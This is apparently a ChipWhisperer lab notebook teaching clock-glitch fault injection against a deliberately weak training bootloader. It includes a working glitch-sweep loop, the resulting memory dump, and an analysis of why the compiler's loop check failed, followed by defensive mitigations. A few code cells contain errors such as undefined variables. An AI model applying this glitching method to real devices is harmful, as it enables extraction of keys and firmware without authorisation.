# Part 1, Topic 3: Clock Glitching to Dump Memory (MAIN)

---
NOTE: This lab references some (commercial) training material on [ChipWhisperer.io](https://www.ChipWhisperer.io). You can freely execute and use the lab per the open-source license (including using it in your own courses if you distribute similarly), but you must maintain notice about this source location. Consider joining our training course to enjoy the full experience.

---

**SUMMARY:** *In the previous lab, we learned how clock glitching can be used to get a microcontroller to skip a password check. In this lab, we'll see if we can glitch a more realistic target: a bootloader's command response.*

**LEARNING OUTCOMES:**

* Applying previous glitch settings to new firmware
* Checking for success and failure when glitching
* Understanding how compiler optimizations can cause devices to behave in strange ways

## The Situation

Now that we've got our feet wet with glitching, we're going to try something a bit more realistic: an "encrypted" bootloader (it's actually just rot-13, but we'll pretend it's unbreakable encryption), where we make as few assumptions as possible. Our goal will be to get that bootloader to decrypt the data and send it back to us. Here's what we know about the bootloader:

1. The `'p'` command is used to write encrypted firmware to the device. It takes in an encrypted ASCII-encoded string, terminated with a newline. Our first chunk of firmware is `"516261276720736265747267206762206f686c207a76797821"`.
1. It does *something* to it (presumably unencrypts it, authenticates it, etc. and writes it to memory)
1. It sends back an error code of `"r000000\n"`

Of immediate interest is that error code. That's the only time the bootloader communicates back with us, so attacking there is a good place to start. One thing that we'll assume is that we've got a trigger right before the error code is sent back to us. This is just a simple `trigger_high()` call, but we could also trigger on an IO line (better with the CW1200 Pro) or with a SAD trigger on a power trace (CW1200 Pro only). We've got a place to start, but let's see if we can learn more about the bootloader first.

We recommend using SimpleSerial V2 for this as, though the firmware doesn't use the simpleserial protocol, the faster baud rate will help speed up glitching.

In [1]:
SCOPETYPE = 'OPENADC'
PLATFORM = 'CWHUSKY'
SS_VER="SS_VER_2_1"

In [67]:
%%bash -s "$PLATFORM" "$SS_VER"
cd ../../../firmware/mcu/bootloader-glitch
make PLATFORM=$1 CRYPTO_TARGET=NONE -j SS_VER=$2

SS_VER set to SS_VER_2_1
SS_VER set to SS_VER_2_1
mkdir -p objdir-CWHUSKY 
.
Welcome to another exciting ChipWhisperer target build!!
arm-none-eabi-gcc (GNU Arm Embedded Toolchain 10.3-2021.10) 10.3.1 20210824 (release)
Copyright (C) 2020 Free Software Foundation, Inc.
This is free software; see the source for copying conditions.  There is NO
warranty; not even for MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.

.
.
.
.
Compiling:
Compiling:
Compiling:
-en     decryption.c ...
Compiling:
-en     bootloader.c ...
.
.
-en     .././simpleserial/simpleserial.c ...
Compiling:
Compiling:
-en     .././hal/hal.c ...
-en     .././hal//sam4s/startup_sam4s.c ...
-en     .././hal//sam4s/sam4s_hal.c ...
.
.
Compiling:
.
Compiling:
.
Compiling:
-en     .././hal//sam4s/pio.c ...
Compiling:
-en     .././hal//sam4s/uart.c ...
-en     .././hal//sam4s/system_sam4s.c ...
-en     .././hal//sam4s/sysclk.c ...
.
Compiling:
-en     .././hal//sam4s/pmc.c ...


bootloader.c: In function 'main':
bootloader.c:90:5: warning: implicit declaration of function 'hex_decode' [-Wimplicit-function-declaration]
   90 |     hex_decode(ascii_idx, (char*)ascii_buffer, data_buffer);
      |     ^~~~~~~~~~


-e Done!
-e Done!
-e Done!
-e Done!
-e Done!
-e Done!
-e Done!
-e Done!
-e Done!
-e Done!
-e Done!
.
LINKING:
-en     bootloader-CWHUSKY.elf ...
Memory region         Used Size  Region Size  %age Used
             rom:        2496 B       128 KB      1.90%
             ram:        4368 B        64 KB      6.67%
-e Done!
.
.
.
.
Creating load file for Flash: bootloader-CWHUSKY.hex
arm-none-eabi-objcopy -O ihex -R .eeprom -R .fuse -R .lock -R .signature bootloader-CWHUSKY.elf bootloader-CWHUSKY.hex
Creating load file for Flash: bootloader-CWHUSKY.bin
arm-none-eabi-objcopy -O binary -R .eeprom -R .fuse -R .lock -R .signature bootloader-CWHUSKY.elf bootloader-CWHUSKY.bin
Creating load file for EEPROM: bootloader-CWHUSKY.eep
arm-none-eabi-objcopy -j .eeprom --set-section-flags=.eeprom="alloc,load" \
	--change-section-lma .eeprom=0 --no-change-warnings -O ihex bootloader-CWHUSKY.elf bootloader-CWHUSKY.eep || exit 0
Creating Extended Listing: bootloader-CWHUSKY.lss
arm-none-eabi-objdump -h -S

In [3]:
%run "../../Setup_Scripts/Setup_Generic.ipynb"

INFO: Found ChipWhisperer😍
scope.gain.mode                          changed from low                       to high                     
scope.gain.gain                          changed from 0                         to 22                       
scope.gain.db                            changed from 15.0                      to 25.091743119266056       
scope.adc.state                          changed from False                     to True                     
scope.adc.samples                        changed from 131124                    to 5000                     
scope.adc.trig_count                     changed from 0                         to 11734437                 
scope.adc.errors                         changed from False                     to trigger too soon error,  
scope.clock.clkgen_freq                  changed from 0                         to 7363636.363636363        
scope.clock.adc_freq                     changed from 0                         to 29454545.454545453

In [4]:
fw_path = "../../../firmware/mcu/bootloader-glitch/bootloader-{}.hex".format(PLATFORM)

In [5]:
cw.program_target(scope, prog, fw_path)

In [62]:
scope.gain.db = 22

The first thing we'll do is some simple power analysis to see what the device is doing when it sends data back to us. Serial communication is pretty slow, so set the ChipWhisperer to capture around 24k samples with a "x1" ADC clock.

In [57]:
help(scope.clock)

Help on ChipWhispererHuskyClock in module chipwhisperer.capture.scopes.cwhardware.ChipWhispererHuskyClock object:

class ChipWhispererHuskyClock(chipwhisperer.common.utils.util.DisableNewAttr)
 |  ChipWhispererHuskyClock(
 |      oaiface: chipwhisperer.capture.scopes._OpenADCInterface.OpenADCInterface,
 |      fpga_clk_settings: chipwhisperer.capture.scopes._OpenADCInterface.ClockSettings,
 |      mmcm1,
 |      mmcm2,
 |      adc: chipwhisperer.capture.scopes.cwhardware.ChipWhispererHuskyMisc.ADS4128Settings
 |  )
 |
 |  Method resolution order:
 |      ChipWhispererHuskyClock
 |      chipwhisperer.common.utils.util.DisableNewAttr
 |      builtins.object
 |
 |  Methods defined here:
 |
 |  __init__(
 |      self,
 |      oaiface: chipwhisperer.capture.scopes._OpenADCInterface.OpenADCInterface,
 |      fpga_clk_settings: chipwhisperer.capture.scopes._OpenADCInterface.ClockSettings,
 |      mmcm1,
 |      mmcm2,
 |      adc: chipwhisperer.capture.scopes.cwhardware.ChipWhispererHuskyMisc

In [85]:
scope.errors.clear()

In [59]:
def reboot_flush():            
    reset_target(scope)
    #Flush garbage too
    target.flush()
scope.clock.adc_mul = 15
scope.clock.clkgen_src = "system"
reboot_flush()
scope.adc.samples = 24000

Next, capture a power trace. The string `"p516261276720736265747267206762206f686c207a76797821\n"` will send the bootloader the first chunk of code and plot it. If you don't see the full serial message, you can increase `scope.adc.decimate`, which will throw out every nth ADC sample.

In [63]:
scope.adc.timeout = 3
scope.arm()
target.write("p516261276720736265747267206762206f686c207a76797821\n")
ret = scope.capture()
if ret:
    print("Timeout")
trace = scope.get_last_trace()
result = target.read(timeout=2)
cw.plot(trace)

:Curve   [x]   (y)

In [64]:
result

'r0\n\n\n\n\n\n'

It doesn't look like anything too crazy is going on here - it's probably just printing some characters in a loop. Some ideas:

* If we glitch at the beginning of the loop, we might be able to corrupt the loop length variable and get it to print some extra memory
* We might be able to corrupt the loop variable and get it to read past where it's supposed to

For SimpleSerial V2, this should be short enough that you can quickly loop through the entirety of the code. If your target isn't using SimpleSerial V2, you should instead select a range a bit (~1000 cycles) before the end of the loop. If this doesn't succeed, you can try going after the cycles at the beginning of the loop.

**HINT: The last part of the loop should be near the beginning of the last power spike.**

**HINT: If you're really stuck on where the serial print ends, you can find the time between the `trigger_high()` and `trigger_low()` call with `scope.adc.trig_count`.**

In [65]:
scope.adc.trig_count

32085

In [45]:
glitch_spots = list(range(scope.adc.trig_count))

### Evaluating Success

Detecting whether our glitch was successful or not isn't quite as trivial as in the previous lab - we don't have a nice error return that the device calculates and sends back to us. One idea is that we can look for part of the string that we sent to the device: there isn't much time between us sending it and the error code being returned. With any luck the compiler will have placed both values close in memory.

Now the rest is up to you! Use what you learned in the previous lab to setup glitch settings and a glitch loop. Here's a few hints to make things easier:

1. Try to use a fairly small width and offset range since we'll need to scan ext_offset as well here. A total range of ~2-3 for each with 0.4 steps is a good range to aim for. These numbers are for CW-Lite/Pro; for CW-Husky, convert as per Fault 1_1.
1. Try looking for a part of the string we sent to the device to check for success.
1. You may want to forgo graphing or plot only successes/crashes if it makes things substantially slower - we're scanning a large range of glitch settings so we'll need all the speed we can get.

Set your glitch up here:

In [43]:
scope.adc.timeout = 0.1

if scope._is_husky:
    scope.glitch.clk_src = "pll"
else:
    scope.glitch.clk_src = "clkgen" 

scope.glitch.output = "clock_xor" # glitch_out = clk ^ glitch
scope.glitch.trigger_src = "ext_single" # glitch only after scope.arm() called
scope.io.hs2 = "glitch"  # output glitch_out on the clock line

print(scope.glitch)

def my_print(text):
    for ch in text:
        if (ord(ch) > 31 and ord(ch) < 127) or ch == "\n": 
            print(ch, end='')
        else:
            print("0x{:02X}".format(ord(ch)), end='')
        print("", end='')

enabled           = True
num_glitches      = 1
clk_src           = pll
mmcm_locked       = True
width             = 0
offset            = 0
trigger_src       = ext_single
arm_timing        = after_scope
ext_offset        = 12020
repeat            = 1
output            = clock_xor
phase_shift_steps = 4592



Again, we can use the glitch controller to make loop setup easier:

In [46]:
gc = cw.GlitchController(groups=["success", "reset", "normal"], parameters=["width", "offset", "ext_offset", "tries"])
gc.display_stats()

IntText(value=0, description='success count:', disabled=True)

IntText(value=0, description='reset count:', disabled=True)

IntText(value=0, description='normal count:', disabled=True)

FloatSlider(value=0.0, continuous_update=False, description='width setting:', disabled=True, max=10.0, readout…

FloatSlider(value=0.0, continuous_update=False, description='offset setting:', disabled=True, max=10.0, readou…

FloatSlider(value=0.0, continuous_update=False, description='ext_offset setting:', disabled=True, max=10.0, re…

FloatSlider(value=0.0, continuous_update=False, description='tries setting:', disabled=True, max=10.0, readout…

In [47]:
x_bound = gc.set_range("width", 3900, 4500)
y_bound = (glitch_spots[0], glitch_spots[-1])
gc.glitch_plot(plotdots={"success":"+g", "reset":"xr", "normal":None}, x_bound=x_bound, y_bound=y_bound,
               x_index="width", y_index="ext_offset")

Parameter name clashes for keys ['data']

:DynamicMap   []
   :Overlay
      .Points.I  :Points   [width,ext_offset]
      .Points.II :Points   [width,ext_offset]

In [66]:
from tqdm import tqdm
# replace with good glitch settings you've found
#gc.set_range("width", 3900, 4500)
#gc.set_range("offset", 3900, 4500)
width_range_start = 3900
width_range_end = 4500

offset_range_start = 2000
offset_range_end = 2500

range_step = 100

ext_range_start = glitch_spots[0]
ext_range_end = glitch_spots[-1]
ext_range_step = 1

total_width_range = (width_range_end - width_range_start) / width_range_step
total_offset_range = (offset_range_end - offset_range_start) / offset_range_step
total_ext_range = (ext_range_end - ext_range_start) / ext_range_step

amount = int(total_width_range * total_offset_range * total_ext_range)

gc.set_range("width", width_range_start, width_range_end)
gc.set_range("offset", offset_range_start, offset_range_end)
gc.set_global_step(range_step)

gc.set_range("ext_offset", ext_range_start, ext_range_end)
gc.set_step("ext_offset", ext_range_step)

gc.set_range("tries", 1, 1)
gc.set_step("tries", 1)

#scope.glitch.repeat = 1
    
for glitch_setting in tqdm(gc.glitch_values(), total=amount):
    scope.glitch.offset = glitch_setting[1]
    scope.glitch.width = glitch_setting[0]
    scope.glitch.ext_offset = glitch_setting[2]

    if scope.adc.state:
        #print("Timeout, trigger still high!")
        gc.add("reset")
        #Device is slow to boot?
        reboot_flush()
        
    target.flush()
    scope.arm()
    target.write("p516261276720736265747267206762206f686c207a76797821\n")
    ret = scope.capture()
    if ret:
        #print('Timeout - no trigger')
        gc.add("reset")

        #Device is slow to boot?
        reboot_flush()
        continue
        
    time.sleep(0.05)
    output = target.read(timeout=2)
    
    if not '767' in output:
        gc.add("normal")
        continue
        
    print("Glitched!\n\tExt offset: {}\n\tOffset: {}\n\tWidth: {}".format(scope.glitch.ext_offset, scope.glitch.offset, scope.glitch.width))
    gc.add("success")
    for __ in range(500):
        num_char = target.in_waiting()
        if num_char:
            print(f'> "{num_char}"')
            my_print(output)
            output = target.read(timeout=50)
    time.sleep(1)
    break

  0%|          | 2/64140 [00:00<1:16:12, 14.03it/s](ChipWhisperer Scope WARNING|File _OpenADCInterface.py:732) Timeout in OpenADC capture(), no trigger seen! Trigger forced, data is invalid. Status: 13
(ChipWhisperer Scope WARNING|File _OpenADCInterface.py:732) Timeout in OpenADC capture(), no trigger seen! Trigger forced, data is invalid. Status: 12
  0%|          | 132/64140 [00:21<2:01:57,  8.75it/s](ChipWhisperer Scope WARNING|File _OpenADCInterface.py:732) Timeout in OpenADC capture(), no trigger seen! Trigger forced, data is invalid. Status: 13
(ChipWhisperer Scope WARNING|File _OpenADCInterface.py:732) Timeout in OpenADC capture(), no trigger seen! Trigger forced, data is invalid. Status: 12
  0%|          | 200/64140 [00:35<2:41:19,  6.61it/s] (ChipWhisperer Scope WARNING|File _OpenADCInterface.py:732) Timeout in OpenADC capture(), no trigger seen! Trigger forced, data is invalid. Status: 13
(ChipWhisperer Scope WARNING|File _OpenADCInterface.py:732) Timeout in OpenADC capture(

Glitched!
	Ext offset: 1801
	Offset: 2300
	Width: 4000
> "199"
r0





6720736265747267206762206f686c207a767978210x000x000x000x000x000x000x000x000x000x000x000x000x000x000x000x000x000x000x000x000x000x000x000x000x000x000x000x000x000x00Don't forget to buy milk!0x000x000x000x000x000x000x000x000x000x000x000x000x000x000x000xAD/0xADy0xCE0xF80xE50x99/0xD90xA50xDA0x900xBF0xBF0xB2lS0xA2*0xCA0x8B0x1F0xF90x830x150x120x84G0xC06U0x090xE00xEF*0xEA~0x98*K0x1D0x1D0xD6o0x140x880x99k?0x050xE10x920xE3K0xFD0xADY0xB1/0x1A0xA60x140xD20xB4`q0x09/f0xE6,0xEFS0xEB0x9Cux0xF6> "17"
]0x1C0xEC0xD2F0xB60x13{0xEE<0xEEQG0x960x1E0xC40xF20xF880x16p0xDCi0x17<0xD10x8B0x9E0xAE0x8A0xE40x89j0x920xF30xD70x1D0xC9TH0xA50xB90xC60xCF&0x9B0xCC0xE70xE2dH0xFC0x87b 8%0xD50xA70x9ED0xE20x1ES0xCE70x99,u0xD60xA9u0x920xEF0xFB0xC80xF080x1EZ0xB60xAF0xCF0xD2l0xEC0x860x080x0C0x920x910x820x88@cBf0xF3]0x810xF6k0xCE0x0D?0xFB0xBD0xD00x7FtLc0x0F;md0xA0Q0xD6n:mvVF@0x130x10/w0xACn0xA90x9B0xF6^z0x830x920x130xE20xC50;0xD40x80~0xBF0x000x9C0xC00xFE0xA90x

 33%|███▎      | 21052/64140 [56:35<1:55:50,  6.20it/s]


---
Glitched!

- Ext offset: 1801
- Offset: 2300
- Width: 4000
---

In [ ]:
import json

def results_to_data(res):
    data = [
        {
            "width": res[index][0][0],
            "offset": res[index][0][1],
            "ext_offset": res[index][0][2],
            "success": res[index][1]['success'],
            "reset": res[index][1]['reset']
        } for index in range(len(res))
    ]
    return data

def save_data(name, data):
    with open(f"data/{name}.json", "w") as file:
        json.dump(data, file)

In [185]:
import pandas as pd

results_1 = gc.calc(ignore_params=[], sort="success_rate")

In [ ]:
results_2 = gc.calc(ignore_params=[], sort="success_rate")

In [ ]:
data_1 = results_to_data(results_1)
save_data("results_1", data_1)

data_2 = results_to_data(results_2)
save_data("results_2", data_2)

In [ ]:
import json

with open("data/results_1.json", "w") as file:
    json.dump(results_1, file)

In [ ]:
import plotly.graph_objects as go

rgba_colors = ['rgba({},{},0,{:.2f})'.format(0xFF * val['reset'],
                                             0xFF * val['success'],
                                             val['success'] + (0.05 * val['reset'])) for val in data]  # Example: fade near zero

go.Figure(go.Scatter3d(
    x=[i['width'] for i in data],
    y=[i['offset'] for i in data],;
    z=[i['ext_offset'] for i in data],
    mode='markers',
    marker=dict(size=5, color=rgba_colors)
)).show()

## Diagnosing the Fault

As you can see by the output, the bootloader has suffered a pretty catastrophic failure! Not only has it spilled the secret, it's also dumped a whole bunch more memory. For a real bootloader, there's probably some pretty juicy stuff in there like encryption keys or previously decrypted firmware. Let's start by taking a look at the C source code that sends the error code back:

```C
trigger_high();

int i;
for(i = 0; i < ascii_idx; i++)
{
    putch(ascii_buffer[i]);
}
trigger_low();
state = IDLE;
```

Nothing really looks too unusual here. Before we take a look at the assembly and figure out what went wrong, let's try to make some guesses:

* Maybe the glitch corrupted the `ascii_idx` variable
    * The glitch happened near the end of the loop. It's unlikely the end of loop counter would be reloaded during the loop
* Maybe we skipped the last `i < ascii_idx` check
    * The glitch caused **a lot** of memory to be dumped. If we just skipped the last check it **should** only print an extra character
* i is a signed integer: maybe we corrupted it into being a really large negative number.

That last one seems to be our best theory, so let's go with that.

## The Answer

Let's check the assembly for our booloader. No need to decompile the binary or recompile to assembly, since there's also a listing file created as part of the build process (`*.lss`). This file also contains C, so it makes it easy to search (try something like the `trigger_high()` call). You might notice that instead of doing a `less than or equal` or `less than` comparison like was in our C code, the compiler has instead inserted a `not equal` comparison instead! This means our original guess may not have been correct, as our assumption about what would happen if the last `i < ascii_idx` was skipped doesn't hold. In fact, it's a lot more likely that the last check was skipped (or i was set to some large value) than flipping a particular bit.

This is actually a pretty unexpected change for the compiler to make, espcially since `less than`, `greater than`, and `not equal` are nearly identical instructions in terms of implementation and have both the same instruction size and speed. This showcases an important fact: the C code that you write is not directly translated to assembly. It needs to go through the compiler first, which may drastically change the intended logic of the program.

Now that we know what happened, let's look at some ways to fix it.

### 1. Volatile variables

C includes a keyword for variables called `volatile`, which indicates that the variable may change between accesses and therefore should not have optimizations applied to it. A typical use case for `volatile` is for peripheral registers on embedded devices. It would be really bad, for example, if you were trying to wait for an IO pin to go high in your code, but the compiler decided it would be faster to only check it only once and assume it doesn't change!

Try replacing `int i = 0;` before the print look with `volatile int i = 0;`, recompile, and check the listing file. Is there any other unexpected changes? What about if you consider the use case above (i.e. if `i` was a register instead of a loop variable)? Is there any way the attack might still work? If so, how might you mitigate this?

### 2. Unrolling the loop

Another potential way of solving this issue would be to manually unroll the loop. The message being printed by the bootloader is a constant length of 7 characters, so we could instead write:

```C
int i;
putch(ascii_buffer[i++]);
putch(ascii_buffer[i++]);
putch(ascii_buffer[i++]);
putch(ascii_buffer[i++]);
putch(ascii_buffer[i++]);
putch(ascii_buffer[i++]);
putch(ascii_buffer[i++]);
```

In fact, this is something the compiler might do on its own to optimize the code, since unrolling a loop like this is faster than the loop version. It's not a good idea to blindly rely on this, however, since the compiler could choose not to make this optimization as well and might change it between builds.

### 3. Checking for invalid characters

Another thing to consider is that the message from the bootloader only has a limited range of characters that it prints. We could instead construct a "safe print" function that only prints newlines, `'r'` and ASCII digits (i.e. `'0'` to `'9'`):

```C
int safe_print(char c)
{
    if ((c == '\n') ||
       ((c >= '0') && (c <= '9')) ||
       (c == 'r')) {
        putch(c);
        return 0;
    }
    return -1; //uh oh!
}
```

It we went this route, it would be a good idea to make the error return a separate buffer with a bunch of null characters at the end.

### 4. More generic methods

More generic ways of defending against glitch attacks (memory guards, for example) are also discussed in the training slides.

In [68]:
scope.dis()
target.dis()